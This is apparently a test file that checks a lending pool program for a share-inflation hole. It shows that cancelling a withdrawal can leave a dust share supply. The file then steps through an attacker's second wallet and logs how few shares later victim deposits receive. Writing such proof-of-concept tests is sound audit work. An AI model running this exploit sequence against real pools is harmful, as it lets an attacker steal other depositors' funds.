import test from 'node:test';
import assert from 'node:assert/strict';
import { U, USDC, advance, cancelWithdrawIx, depositBorrowerIx, depositIx, drawIx, newLender, open, readPool, repayIx, requestWithdrawIx, sendB, sendL, setup, tokenBalance, mintSupply, COOLDOWN, claimWithdrawIx } from '/home/bills/code/dev3pack/notch/tests/lib.js';

test('cancel can leave a dust share supply (inflation path the claim path forbids)', async () => {
  const ctx = await setup({ seed: 100n * USDC, borrowerFunds: 200n * USDC });
  const a = ctx.lender; // holds 100e6 junior shares
  const b = await newLender(ctx, 10n * USDC); // attacker's 2nd wallet
  const rb = await sendL(ctx, b, depositIx(ctx, b, 1n)); // 1 base unit -> 1 share
  console.log('b deposit 1 unit ok?', rb.ok, 'b shares', tokenBalance(ctx.svm, b.shares));
  assert.ok((await sendL(ctx, a, await requestWithdrawIx(ctx, a, 100n * USDC))).ok);
  await open(ctx, 200);
  assert.ok((await sendB(ctx, depositBorrowerIx(ctx, U(20)))).ok);
  assert.ok((await sendB(ctx, drawIx(ctx, 100n * USDC))).ok);
  advance(ctx, 31);
  assert.ok((await sendB(ctx, repayIx(ctx, U(102)))).ok);
  const r = await sendL(ctx, a, await cancelWithdrawIx(ctx, a));
  console.log('cancel ok?', r.ok);
  const p = readPool(ctx.svm, ctx.pool);
  const sup = mintSupply(ctx.svm, ctx.shareMint);
  console.log('after cancel: supply', sup, 'juniorNav', p.juniorNav, 'a shares', tokenBalance(ctx.svm, a.shares), 'b shares', tokenBalance(ctx.svm, b.shares));
  // victim deposits
  const v = await newLender(ctx, 100n * USDC);
  for (const amt of [1n * USDC, 3n * USDC, 5n * USDC]) {
    const supB = mintSupply(ctx.svm, ctx.shareMint); const navB = readPool(ctx.svm, ctx.pool).juniorNav;
    const before = tokenBalance(ctx.svm, v.shares);
    const rr = await sendL(ctx, v, depositIx(ctx, v, amt));
    const got = tokenBalance(ctx.svm, v.shares) - before;
    const s2 = mintSupply(ctx.svm, ctx.shareMint); const n2 = readPool(ctx.svm, ctx.pool).juniorNav;
    console.log(`victim deposit ${amt}: ok=${rr.ok} shares=${got} worth now=${s2 ? (got * n2) / s2 : 0n}`);
  }
});
